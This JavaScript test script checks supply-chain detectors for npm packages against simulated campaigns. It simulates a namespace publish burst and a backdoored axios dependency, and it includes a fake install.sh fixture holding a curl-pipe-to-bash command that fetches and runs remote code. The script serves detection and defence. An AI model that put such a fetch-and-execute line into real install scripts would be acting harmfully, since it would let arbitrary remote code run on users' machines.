import { scan as d10scan } from '../detectors/tier1-self-propagation.js';
import { scan as d11scan } from '../detectors/tier1-encrypted-c2.js';
import { scan as d12scan } from '../detectors/tier1-transitive-deps.js';
import { scan as d13scan } from '../detectors/tier1-maintainer-compromise.js';

const results = [];

// D10 + D13: @redhat-cloud-services Miasma (32 packages, 12 versions in 2 hours)
const miasmaTime = { '0.0.1': '2024-01-01T00:00:00.000Z' };
for (let i = 0; i < 12; i++) {
  const t = new Date('2026-06-01T03:00:00Z');
  t.setMinutes(t.getMinutes() - (12 - i) * 10);
  miasmaTime[`2.${i}.0`] = t.toISOString();
}
const miasmaRegistryD10 = {
  time: miasmaTime,
  namespacePackages: Array.from({ length: 31 }, (_, i) => `@redhat-cloud-services/pkg-${i}`),
};
const miasmaRegistryD13 = {
  time: miasmaTime,
  crossPackageBurst: true,
};

const d10Result = await d10scan(
  { name: '@redhat-cloud-services/foo', version: '2.11.0' },
  [],
  miasmaRegistryD10,
  null
);
const d13Result = await d13scan(
  { name: '@redhat-cloud-services/foo', version: '2.11.0' },
  [],
  miasmaRegistryD13,
  null
);

results.push({
  campaign: '@redhat-cloud-services Miasma',
  detectors: {
    D10: { triggered: d10Result.length > 0, confidence: d10Result[0]?.confidenceScore || 0 },
    D13: { triggered: d13Result.length > 0, confidence: d13Result[0]?.confidenceScore || 0 },
  },
});

// D11: TanStack Mini Shai-Hulud
const tanStackFiles = [
  { path: 'install.sh', content: 'curl -s https://filev2.getsession.org/upload | bash' },
];
const d11Result = await d11scan(
  { name: '@tanstack/react-query', version: '4.29.1' },
  tanStackFiles,
  null,
  null
);

results.push({
  campaign: 'TanStack Mini Shai-Hulud',
  detectors: {
    D11: { triggered: d11Result.length > 0, confidence: d11Result[0]?.confidenceScore || 0 },
  },
});

// D12: Axios Backdoor (plain-crypto-js)
const d12Result = await d12scan(
  {
    name: 'test-app',
    dependencies: { axios: '1.14.1', 'plain-crypto-js': '1.0.0', lodash: '4.17.21' },
  },
  [],
  null,
  null
);

results.push({
  campaign: 'Axios Backdoor',
  detectors: {
    D12: { triggered: d12Result.length > 0, confidence: d12Result[0]?.confidenceScore || 0 },
  },
});

let allPassed = true;
for (const { campaign, detectors } of results) {
  const details = Object.entries(detectors)
    .map(([d, r]) => `${d}: ${r.triggered ? 'PASS' : 'FAIL'} (confidence ${r.confidence})`)
    .join(', ');
  const campaignPassed = Object.values(detectors).every((r) => r.triggered);
  console.log(`${campaignPassed ? 'PASS' : 'FAIL'} ${campaign}: ${details}`);
  if (!campaignPassed) allPassed = false;
}

if (allPassed) {
  console.log('\nAll campaigns validated successfully.');
} else {
  console.log('\nSome campaigns FAILED validation.');
}

const output = {
  timestamp: new Date().toISOString(),
  results,
  passed: allPassed,
};
const fs = await import('fs');
fs.writeFileSync('validation-d10-d13.json', JSON.stringify(output, null, 2));
